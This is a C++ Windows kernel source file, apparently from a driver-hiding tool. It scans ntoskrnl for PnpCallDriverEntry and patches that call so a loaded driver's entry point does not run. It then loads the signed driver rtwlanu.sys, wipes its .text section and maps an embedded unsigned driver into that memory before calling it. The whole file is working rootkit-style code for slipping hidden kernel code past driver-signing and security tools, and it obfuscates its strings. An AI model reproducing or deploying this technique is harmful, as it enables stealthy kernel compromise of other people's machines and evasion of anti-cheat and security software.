#include <ntifs.h>
#include <windef.h>
#include <cstdint>
#include <intrin.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntstrsafe.h>

#include <kernel/defs.h>
#include <kernel/structures.hpp>
#include <kernel/xor.hpp>

#include <impl/communication/structs.h>

#include <impl/imports.h>
#include <impl/scanner.h>
#include <impl/modules.h>
#include <impl/drivers.h>
#include <impl/data.h>
#include <impl/pe_utils64.h>
#include <impl/mapper.h>

#define PATCH_LENTH 5

modules::section_data text_section = modules::section_data();
modules::section_data data_section = modules::section_data();

NTSTATUS map_new_driver()
{
	const auto driver_size = sizeof(raw_driver_bytes);
	
	PVOID base = (PVOID)text_section.address;
	ULONG size = text_section.size;

	const auto local_driver_base = reinterpret_cast<uintptr_t>(imports::ex_allocate_pool(NonPagedPool, driver_size));
	if (!local_driver_base)
	{
		printf("Failed to allocate local driver base.\n");
		return STATUS_UNSUCCESSFUL;
	}
	
	crt::kmemcpy(reinterpret_cast<void*>(local_driver_base), raw_driver_bytes, driver_size);
	
	const auto dos_headers = reinterpret_cast<PIMAGE_DOS_HEADER>(local_driver_base);
	const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(local_driver_base + dos_headers->e_lfanew);
	
	if (nt_headers->OptionalHeader.SizeOfImage > size)
	{
		printf("Driver size too big.\n");
		return STATUS_UNSUCCESSFUL;
	}

	PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((BYTE*)(&nt_headers->FileHeader) + sizeof(IMAGE_FILE_HEADER) + nt_headers->FileHeader.SizeOfOptionalHeader);
	for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) 
	{
		crt::kmemcpy(
			reinterpret_cast<void*>(local_driver_base + section->VirtualAddress),
			raw_driver_bytes + section->PointerToRawData, 
			section->SizeOfRawData
		);
	}
	
	mapper::resolve_relocs(local_driver_base, nt_headers);
	mapper::resolve_imports(local_driver_base, nt_headers);
	mapper::unload_discardable_sections(local_driver_base, nt_headers);
	
	ctx::write_protected_address(base, (void*)local_driver_base, nt_headers->OptionalHeader.SizeOfImage, true);
	
	imports::ex_free_pool_with_tag(reinterpret_cast<void*>(local_driver_base), 0);
	
	unsigned long long(*DriverEntry)(PDRIVER_OBJECT obj, PUNICODE_STRING str) =
		(unsigned long long(*)(PDRIVER_OBJECT, PUNICODE_STRING))(((BYTE*)base + nt_headers->OptionalHeader.AddressOfEntryPoint));
	
	return DriverEntry((PDRIVER_OBJECT)0, (PUNICODE_STRING)0);
}

NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
{
	const auto ntoskrnl = modules::get_kernel_module(skCrypt("ntoskrnl.exe"));
	if (!ntoskrnl)
	{
		printf("Couldnt find ntoskrnl.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Ntoskrnl base: 0x%llx\n", ntoskrnl.address);

	const auto calldrv_address = scanner::find_pattern(ntoskrnl.address, "\xE8\x00\x00\x00\x00\x44\x8B\xF0\x85\xC0\x78\x15", "x????xxxxxxx");
	if (!calldrv_address)
	{
		printf("Invalid pattern.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("PnpCallDriverEntry address: 0x%llx\n", calldrv_address);

	const auto original_bytes = reinterpret_cast<uint8_t*>(imports::ex_allocate_pool(NonPagedPool, PATCH_LENTH));
	if (!original_bytes)
	{
		printf("Failed to allocate buffer.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Original bytes buffer: 0x%llx\n", (reinterpret_cast<uintptr_t>(original_bytes)));

	// Patch IopLoadDriver to not call driver entry
	ctx::nop_address_range(calldrv_address, PATCH_LENTH, original_bytes);

	// Load driver to exploit
	if (!modules::load_vurn_driver(skCrypt(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv")))
	{
		printf("Couldnt load driver.\n");
		ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
		imports::ex_free_pool_with_tag(original_bytes, 0);
		return STATUS_UNSUCCESSFUL;
	}
	printf("Loaded vurnable driver.\n");
	
	// Restore bytes
	ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
	imports::ex_free_pool_with_tag(original_bytes, 0);

	printf("Restored original bytes.\n");

	const auto vurn_driver = modules::get_kernel_module(skCrypt("rtwlanu.sys"));
	if (!vurn_driver)
	{
		printf("Couldnt find vurnable driver.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Vurnable driver base: 0x%llx\n", vurn_driver.address);

	text_section = modules::find_section(vurn_driver.address, skCrypt(".text"));
	if (!text_section) 
	{
		printf("Text section is invalid.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Text section size: 0x%llx\n", text_section.size);
	printf("Text section base: 0x%llx\n", text_section.address);

	data_section = modules::find_section(vurn_driver.address, skCrypt(".data"));
	if (!data_section)
	{
		printf("Data section is invalid.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Data section size: 0x%llx\n", data_section.size);
	printf("Data section base: 0x%llx\n", data_section.address);

	// Zero .text section
	ctx::zero_address_range(text_section.address, text_section.size);

	// Zero .data section
	//ctx::zero_address_range(data_section.address, data_section.size);

	return map_new_driver();
}